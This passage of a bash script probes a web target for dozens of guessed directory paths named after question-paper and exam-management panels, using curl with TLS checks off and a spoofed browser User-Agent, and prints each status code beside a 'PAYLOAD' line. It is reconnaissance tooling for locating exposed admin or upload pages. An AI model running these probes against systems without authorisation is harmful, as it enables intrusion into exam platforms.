code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
